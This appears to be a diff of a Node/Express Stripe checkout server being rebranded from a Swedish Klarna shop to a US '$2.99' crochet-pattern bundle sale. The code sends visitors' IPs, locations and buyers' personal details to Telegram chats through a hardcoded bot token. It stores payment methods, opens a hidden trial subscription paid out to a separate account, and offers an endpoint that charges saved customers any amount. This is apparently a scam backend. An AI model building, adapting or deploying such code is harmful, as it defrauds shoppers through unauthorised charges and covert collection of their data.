@@ -6,7 +6,7 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 
 const app = express();
-const ACCOUNT_B = 'acct_1Tc7qURl3x41SCCJ';
+const ACCOUNT_B = 'acct_1Tc7YyBY9xQDWIiH';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -64,18 +64,18 @@ app.use(bodyParser.json());
 app.post('/page-visit', async (req, res) => {
   const { visitorId, ip, country, city } = req.body;
   await sendTelegram(
-    `👁 <b>Ny sidbesökare!</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `🌍 Land: ${country || 'Okänt'}\n` +
-    `🏙 Stad: ${city || 'Okänt'}\n` +
-    `🔌 IP: ${ip || 'Okänt'}\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    `👁 <b>New Page Visitor!</b>\n\n` +
+    `🆔 Visitor ID: <code>${visitorId}</code>\n` +
+    `🌍 Country: ${country || 'Unknown'}\n` +
+    `🏙 City: ${city || 'Unknown'}\n` +
+    `🔌 IP: ${ip || 'Unknown'}\n` +
+    `🕐 Time: ${new Date().toLocaleString('en-US')}`
   );
   res.json({ ok: true });
 });
 
 app.post('/create-setup-intent', async (req, res) => {
-  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
+  let { email, fname, lname, phone, visitorId } = req.body;
   email = email.trim().replace(/\.$/, '');
 
   try {
@@ -86,25 +86,25 @@ app.post('/create-setup-intent', async (req, res) => {
     } else {
       customer = await stripe.customers.create({
         email,
-        address: { country: 'SE' },
       });
     }
 
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['klarna'],
+      payment_method_types: ['amazon_pay'],
       metadata: { customer_id: customer.id },
     });
 
     await sendTelegram(
-      `🛒 <b>Kassauppgifter!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `📧 E-post: ${email}\n` +
-      `👤 Namn: ${fname} ${lname}\n` +
-      `📍 Adress: ${address}, ${zip} ${city}, ${country}\n` +
-      `📞 Telefon: ${phone || 'N/A'}\n` +
-      `💰 Belopp: 1499 kr\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `🛒 <b>Checkout Information!</b>\n\n` +
+      `🆔 Visitor ID: <code>${visitorId}</code>\n` +
+      `📧 Email: ${email}\n` +
+      `👤 Name: ${fname} ${lname}\n` +
+      `📞 Phone: ${phone || 'N/A'}\n` +
+      `💰 Amount: $2.99\n` +
+      `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
+      `⬇️ Delivery: Instant Download\n` +
+      `🕐 Time: ${new Date().toLocaleString('en-US')}`
     );
 
     res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
@@ -117,11 +117,11 @@ app.post('/create-setup-intent', async (req, res) => {
 app.post('/payment-initiated', async (req, res) => {
   const { visitorId, email } = req.body;
   await sendTelegram(
-    `💳 <b>Betalningsförsök startat!</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `📧 E-post: ${email}\n` +
-    `⏳ Kunden har klickat på "Betala nu"\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    `💳 <b>Payment Attempt Started!</b>\n\n` +
+    `🆔 Visitor ID: <code>${visitorId}</code>\n` +
+    `📧 Email: ${email}\n` +
+    `⏳ Customer clicked "Pay Now"\n` +
+    `🕐 Time: ${new Date().toLocaleString('en-US')}`
   );
   res.json({ ok: true });
 });
@@ -146,11 +146,11 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 255 SEK
+    // Charge 1 — $2.99 USD
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 25500,
-        currency: 'sek',
+        amount: 299,
+        currency: 'usd',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -168,7 +168,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1TjIoSKvv28EvAs9OhHObYgf' }],
+      items: [{ price: 'price_1TgtohD9m5cj7UNqiKNCDw94' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -176,12 +176,13 @@ app.post('/create-subscription', async (req, res) => {
     console.log('Subscription created:', subscription.id, subscription.status);
 
     await sendTelegram(
-      `✅ <b>Betalning lyckades!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: 9588 kr\n` +
-      `🆔 Prenumeration: ${subscription.id}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `✅ <b>Payment Successful!</b>\n\n` +
+      `🆔 Visitor ID: <code>${visitorId}</code>\n` +
+      `💳 Payment Method: ${pmType}\n` +
+      `💳 Payment Amount: $2.99\n` +
+      `🆔 Subscription: ${subscription.id}\n` +
+      `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
+      `🕐 Time: ${new Date().toLocaleString('en-US')}`
     );
 
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
@@ -199,7 +200,7 @@ app.get('/customers', (req, res) => {
 
 // ─── Manually charge a saved customer ────────────────────────────────────────
 // POST /charge-saved
-// Body: { "customerId": "cus_xxx", "amount": 459900, "currency": "sek" }
+// Body: { "customerId": "cus_xxx", "amount": 299, "currency": "usd" }
 app.post('/charge-saved', async (req, res) => {
   const { customerId, amount, currency } = req.body;
   const customers = loadCustomers();
@@ -211,8 +212,8 @@ app.post('/charge-saved', async (req, res) => {
 
   try {
     const payment = await stripe.paymentIntents.create({
-      amount: amount || 459900,
-      currency: currency || 'sek',
+      amount: amount || 299,
+      currency: currency || 'usd',
       customer: customer.customerId,
       payment_method: customer.paymentMethodId,
       payment_method_types: [customer.pmType],
@@ -224,11 +225,12 @@ app.post('/charge-saved', async (req, res) => {
     console.log('Manual charge created:', payment.id, payment.status);
 
     await sendTelegram(
-      `💰 <b>Manuell betalning!</b>\n\n` +
-      `🆔 Kund: <code>${customerId}</code>\n` +
-      `💳 Belopp: ${(amount || 459900) / 100} kr\n` +
+      `💰 <b>Manual Payment!</b>\n\n` +
+      `🆔 Customer: <code>${customerId}</code>\n` +
+      `💳 Amount: $${((amount || 299) / 100).toFixed(2)}\n` +
       `📋 Status: ${payment.status}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
+      `🕐 Time: ${new Date().toLocaleString('en-US')}`
     );
 
     res.json({ success: true, paymentId: payment.id, status: payment.status });
